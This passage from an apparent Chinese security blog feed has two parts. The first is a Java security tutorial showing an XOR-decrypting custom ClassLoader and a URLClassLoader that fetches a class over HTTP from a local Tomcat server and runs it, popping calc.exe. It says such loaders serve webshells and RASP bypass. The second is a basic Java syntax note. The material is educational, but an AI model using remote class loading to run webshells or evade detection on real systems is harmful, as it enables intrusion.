punctuation">></span></span> <span class="token function">findClass</span><span class="token punctuation">(</span><span class="token class-name">String</span> className<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> c <span class="token operator">=</span> <span class="token function">findLoadedClass</span><span class="token punctuation">(</span>className<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>c <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> c<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">ClassLoader</span> parent <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getParent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                c <span class="token operator">=</span> parent<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span>className<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">ClassNotFoundException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token comment">// System.out.println("父类无法加载你的class，抛出ClassNotFoundException,已捕获，继续运行");</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>c <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"父类成功加载"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> c<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token comment">// 读取文件 转化成字节数组</span>                <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> classData <span class="token operator">=</span> <span class="token function">getClassData</span><span class="token punctuation">(</span>className<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>classData <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">ClassNotFoundException</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 调用defineClass()方法</span>                    c <span class="token operator">=</span> <span class="token function">defineClass</span><span class="token punctuation">(</span>className<span class="token punctuation">,</span> classData<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> classData<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">return</span> c<span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">getClassData</span><span class="token punctuation">(</span><span class="token class-name">String</span> className<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">String</span> path <span class="token operator">=</span> rootDir <span class="token operator">+</span> <span class="token string">"/"</span> <span class="token operator">+</span> className<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token char">'.'</span><span class="token punctuation">,</span> <span class="token char">'/'</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">".class"</span><span class="token punctuation">;</span>        <span class="token comment">// 将流中的数据转换为字节数组</span>        <span class="token class-name">InputStream</span> is <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token class-name">ByteArrayOutputStream</span> baos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            is <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> buffer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token number">1024</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> temp <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>            <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>temp <span class="token operator">=</span> is<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                baos<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>temp <span class="token operator">^</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">return</span> baos<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">finally</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>is <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                    is<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>baos <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                    baos<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>这里我们使用将Decryption继承ClassLoader类，之后覆盖findClass()方法，并且在findClass()方法中调用defineClass()方法使用，最后加载我们自定义的getClassData方法去进行解密操作。</p><p>最后我们使用一个Demo进行测试，去查看当前类加载器机制的情况。如果我们想要获取其输出的System.out.println语句，需要反射机制去实现。这篇文章我们只学习ClassLoader类应用，就不去涉及其他知识点，获取其类加载器查看即可。</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>testCypher</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Demo</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Decryption</span> deLoader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Decryption</span><span class="token punctuation">(</span><span class="token string">"/usr/local/temp/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 解密加载器</span>        <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> t1 <span class="token operator">=</span> deLoader<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span><span class="token string">"com.test.CypherTest"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 加载已加密的类</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"c3 的Class是  "</span> <span class="token operator">+</span> t1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p><img src="11.png" loading="lazy"></p><h2 id="URLClassLoader"><a href="#URLClassLoader" class="headerlink" title="URLClassLoader"></a>URLClassLoader</h2><p>除了上述自定义ClassLoader类，我们还可以学习URLClassLoader。URLClassLoader类继承ClassLoader类，可以加载本地磁盘和网络中的jar包类文件。</p><h3 id="1-本地磁盘class文件调用"><a href="#1-本地磁盘class文件调用" class="headerlink" title="1. 本地磁盘class文件调用"></a>1. 本地磁盘class文件调用</h3><p>首先我在D盘创建了一个Test.java文件，写了一段calc.exe计算机弹窗代码。如果文件被成功解析执行，会输出Test success字段且弹出计算器。</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>test</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Test</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Test success!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">try</span><span class="token punctuation">&#123;</span>            <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"cmd /c calc.exe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>         <span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>然后使用javac进行编译，在D盘生成对应的class文件。</p><p><img src="12.png" loading="lazy"></p><p>之后我们再修改ClassLoaderTest类，利用URLClassLoader方式去获取D盘中Test.class文件。</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span></span><span class="token class-name">Classloader</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">File</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">URI</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">URL</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">URLClassLoader</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ClassLoaderTest</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>        <span class="token class-name">File</span> file <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token string">"d:/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">URI</span> uri <span class="token operator">=</span> file<span class="token punctuation">.</span><span class="token function">toURI</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">URL</span> url <span class="token operator">=</span> uri<span class="token punctuation">.</span><span class="token function">toURL</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">URLClassLoader</span> classLoader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLClassLoader</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>url<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Class</span> clazz <span class="token operator">=</span> classLoader<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span><span class="token string">"com.test.Test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        clazz<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>这里使用File获取类文件路径，之后使用URLClassLoader获取url地址为D盘，之后使用loadClass方法获取Test.class所含包名，然后实例化。运行发现解析获取到了D盘中Test.class文件。</p><p><img src="13.png" loading="lazy"></p><h3 id="2-网络传输class文件调用"><a href="#2-网络传输class文件调用" class="headerlink" title="2. 网络传输class文件调用"></a>2. 网络传输class文件调用</h3><p>之后我们将Test.class放置到电脑的Tomcat服务器目录下，然后启动Tomcat。之后新建个ClassLoaderDemo类网络加载Tomcat服务器中的Test.class.</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span></span><span class="token class-name">Classloader</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">URL</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">URLClassLoader</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ClassLoaderDemo</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">URL</span> url <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span><span class="token string">"http://localhost:8080/examples/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">URLClassLoader</span> classLoader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLClassLoader</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>url<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Class</span> clazz <span class="token operator">=</span> classLoader<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span><span class="token string">"com.test.Test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        clazz<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>这里使用URLClassLoader加载网络中的Tomcat服务器目录，成功解析获取到了目录下的Test.class文件。</p><p><img src="14.png" loading="lazy"></p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>通过ClassLoader类的学习，我们知道不仅仅局限于在ClassPath中类的调用，还能够通过自定义CLassLoader类来加载我们特定的类来操作利用。在安全领域当中，我们往往会使用其ClassLoader特性，自定义恶意的类加载webshell利用以及自定以类字节码的native方法绕过RASP检测。所以了解ClassLoader特性并进行自定义编写，对我们了解java安全机制十分重要。</p><p>转载大佬文章</p><p><a href="https://xz.aliyun.com/t/9002?accounttraceid=1182a6e93e8242f58d4e872678042864ieed#toc-3">JAVA安全基础（一）–类加载器（ClassLoader） - 先知社区 (aliyun.com)</a></p>]]></content>
      
      
      <categories>
          
          <category> 安全相关 </category>
          
          <category> Java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java基础学习笔记</title>
      <link href="/2024/08/31/Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2024/08/31/Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p><strong>纸上得来终觉浅,绝知此事要躬行。</strong></p><p><a href="https://aigz8jy30yo.feishu.cn/docx/EkhJdSJZPo5L22xSujzcdqvVnjf">Java入门教程-上</a></p><p><a href="https://aigz8jy30yo.feishu.cn/docx/HKzhdYw84oXiY6x9hVhcEMT8nXg">Java入门教程-下</a></p><p><a href="https://aigz8jy30yo.feishu.cn/docx/BtbOd3c5aotnpdxYTVDcnqQanxd">Java Web开发教程</a></p><p>(感谢好朋友的分享)</p><p><a href="https://github.com/bfengj/CTF/blob/main/Web/java/Java%E5%9F%BA%E7%A1%80/Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89.md">CTF-Java基础</a></p><p><a href="https://www.cainiaojc.com/java/java-reflection.html">Java 反射(Reflection)</a></p><h3 id="Java程序设计环境"><a href="#Java程序设计环境" class="headerlink" title="Java程序设计环境"></a>Java程序设计环境</h3><ul><li>JDK：编写Java程序的程序员使用的软件。</li><li>SE：用于桌面或简单服务器应用的Java平台。</li><li>OpenJDK：Java SE的一个免费开源实现。</li></ul><p>JDK安装目录介绍</p><table><thead><tr><th><strong>目录名称</strong></th><th><strong>说明</strong></th></tr></thead><tbody><tr><td>bin</td><td>该路径下存放了JDK的各种工具命令。javac和java就放在这个目录。</td></tr><tr><td>conf</td><td>该路径下存放了JDK的相关配置文件。</td></tr><tr><td>include</td><td>该路径下存放了一些平台特定的头文件。</td></tr><tr><td>jmods</td><td>该路径下存放了JDK的各种模块。</td></tr><tr><td>legal</td><td>该路径下存放了JDK各模块的授权文档。</td></tr><tr><td>lib</td><td>该路径下存放了JDK工具的一些补充JAR包。</td></tr></tbody></table><p>JVM（Java Virtual Machine），Java虚拟机</p><p>JRE（Java Runtime Environment），Java运行环境，包含了JVM和Java的核心类库（Java API）</p><p>JDK（Java Development Kit）称为Java开发工具，包含了JRE和开发工具</p><h3 id="Hello-World"><a href="#Hello-World" class="headerlink" title="Hello World"></a>Hello World</h3><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">HelloWorld</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"HelloWorld"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>用到两个命令：</p><pre class="language-java" data-language="java"><code class="language-java">javac <span class="token operator">+</span> 文件名 <span class="token operator">+</span> 后缀名 （就是编译java文件）java <span class="token operator">+</span> 文件名（运行编译之后的<span class="token keyword">class</span>文件）</code></pre><h4 id="一些注意点"><a href="#一些注意点" class="headerlink" title="一些注意点"></a>一些注意点</h4><ul><li><p>Java代码中，是严格区分大小写的（比如System）</p></li><li><p>类是构建所有Java应用程序和appllet的构建块，Java应用程序中的全部内容都必须放置在类中。</p></li><li><p>类名必须以字母开头。且命名规范是骆驼命名法。</p></li><li><blockquote><p><strong>驼峰命令法(Camel)</strong></p><p>也称骆驼式命名法正如它的名称所表示的那样，是指混合使用大小写字母来构成变量和函数的名字例如，下面是分别用骆驼式命名法和下划线法命名的同一个函数：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token function">printEmployeePaychecks</span><span class="token punctuation">(</span><span class="token punctuation">)</span>；<span class="token function">print_employee_paychecks</span><span class="token punctuation">(</span><span class="token punctuation">)</span>；</code></pre><p>第一个函数名使用了骆驼式命名法，函数名中的每一个逻辑断点都有一个大写字母来标记；第二个函数名使用了下划线法，函数名中的每一个逻辑断点都有一个下划线来标记</p></blockquote></li><li><p>源代码的文件名必须与公共类的名字相同，并用.java作为拓展名。</p></li><li><p>运行已编译的程序时，Java虚拟机总是从指定类的main方法开始执行。且main方法必须声明为public，且必须是静态的(static)。</p></li></ul><h3 id="Java基础语法"><a href="#Java基础语法" class="headerlink" title="Java基础语法"></a>Java基础语法</h3><h4 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h4><p>Java中的注释分为三种：</p><ul><li>单行注释：</li></ul><pre class="language-Java" data-language="Java"><code class="language-Java">&#x2F;&#x2F; 这是单行注释文字</code></pre><ul><li>多行注释：</li></ul><pre class="language-Java" data-language="Java"><code class="language-Java">&#x2F;*这是多行注释文字这是多行注释文字这是多行注释文字*&#x2F;</code></pre><p>注意：多行注释不能嵌套使用。</p><ul><li>文档注释（暂时用不到）：</li></ul><pre class="language-Java" data-language="Java"><code class="language-Java">&#x2F;**这是多行注释文字这是多行注释文字这是多行注释文字*&#x2F;</code></pre><p><strong>使用的技巧</strong></p><ol><li>如果我们要对代码进行解释，那么就可以使用注释。</li><li>当注释的内容比较少，一行就写完了，可以用单行注释。</li><li>如果注释的内容比较多，需要写在多行，那么可以使用多行注释。</li></ol><p><strong>注意：</strong>注释的内容不会参与编译和运行的，仅仅是对代码的解释说明而已。所以，不管在注释当中写什么内容，都不会影响代码运行的结果。</p><h4 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h4><p>Java是强类型语言，必须为变量声明类型。Java中一共八种基本类型，4种整形，2种浮点类型，1种字符串类型char和boolean类型。</p><p><strong>整形</strong>：int,short,long,byte。</p><p>Java中整形的范围与运行Java代码的机器无关。</p><ul><li>long：<code>400000L</code></li><li>十六进制：<code>0xCA</code></li><li>八进制：<code>010</code></li><li>二进制：<code>0b1001</code></li></ul><p>Java没有任何无符号形式的整形类型。</p><p><strong>浮点</strong>：float double</p><p>没有后缀F的浮点数值总是默认为double类型。当然也可以在最后添加后缀D或d。</p><p>浮点数值不适合于无法接受舍入误差的金融计算。如果在数值计算中不允许有任何舍入误差，就应该使用BigDecimal类。</p><p><strong>char类型</strong></p><p>char类型原本用于表示单个字符，不过现在如今有些Unicode字符可以用一个char值描述，另外一些unicode字符则需要2个char值。</p><p>char类型的字面量要用单引号括起来，例如’A’是编码值为65的字符常量。</p><p>char类型的值可以表示为十六进制，从\u0000到\uffff。</p><p>转义序列\u还可以出现在加引号的字符常量或字符串之外，而其他的所有转义序列都不行，例如：</p><pre class="language-none"><code class="language-none">public static void main(String\u005B\u005D args)&#96;，是&#96;[]</code></pre><p>Unicode转义序列会在解析代码之前得到处理，例如：</p><pre class="language-none"><code class="language-none">&quot;\u0022+\u0022&quot;&#96;是&#96;&quot;&quot;+&quot;&quot;</code></pre><p>强烈建议不要在程序中使用char类型，最好将字符串作为抽象数据类型使用。</p><p><strong>boolean</strong>类型</p><p>false和true。<strong>整型值和布尔值之间不能进行相互转换</strong></p><p><strong>变量与常量</strong></p><p>Java中的数字和字母范围更大。</p><p>声明一个变量之后，必须用赋值语句对变量进行<strong>显式</strong>初始化，千万不要使用未初始化的变量的值。</p><p>Java中可以将声明放在代码中的任何地方。但是变量的声明尽可能地靠近变量第一次使用的地方，这是一种良好的程序编写风格。</p><p><strong>从Java10开始，对于局部变量，如果可以从变量的初始值推断出它的类型，就不再需要声明类型，只需要使用关键字var而无需指定类型</strong></p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">var</span> feng <span class="token operator">=</span> <span class="token number">12</span><span class="token punctuation">;</span><span class="token keyword">var</span> fff <span class="token operator">=</span> <span class="token string">"feng"</span><span class="token punctuation">;</span></code></pre><p>用final指示常量。final表示这个常量只能被赋值一次。常量名使用全大写。</p><p>如果一个常量在类的多个方法中被使用，通常将其设置成类常量，用<code>static final</code>。且类常量的定义放在main方法的外部</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span><span class="token punctuation">&#123;</span>    <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">double</span> <span class="token constant">PI</span> <span class="token operator">=</span> <span class="token number">3.14</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token constant">PI</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>如果一个常量被声明为<code>public</code>，那么其他类的方法也可以使用这个常量。</p><p><strong>枚举</strong></p><p>枚举类型包括有限个命名的值。</p><p>当参与<code>/</code>运算的两个操作数都是整数时，表示整数除法，否则表示浮点除法。</p><p>整数被0除会产生一个异常，而浮点数被0除将会得到无穷大或NAN结果。</p><p>Math类包含了各种各样的数学函数：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">double</span> x <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span><span class="token keyword">double</span> y <span class="token operator">=</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">sqrt</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>Java没有幂运算，需要结果Math.pow方法：<code>double y = Math.pow(x,a);</code>。pow方法有2个double类型参数，返回结果也是double类型。</p><p>此外还有2个最接近的近似值：<code>Math.PI</code>和<code>Math.E</code>来表示π和e。</p><p>静态导入：<code>import static java.lang.Math.*</code></p><p>强制类型转换是在圆括号中给出想要转换的目标类型，后面紧跟待转换的变量名：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">double</span> x <span class="token operator">=</span> <span class="token number">9.997</span><span class="token punctuation">;</span><span class="token keyword">int</span> nx <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">round</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h5 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a><strong>字符串</strong></h5><p>Java没有内置的字符串类型，而是在标准Java类库中提供了一个预定义类，叫做String。每个用双引号括起来的字符串都是String类的一个实例。</p><p>用substring方法提取字串</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> feng <span class="token operator">=</span> <span class="token string">"hello,world"</span><span class="token punctuation">;</span><span class="token class-name">String</span> s <span class="token operator">=</span> feng<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token 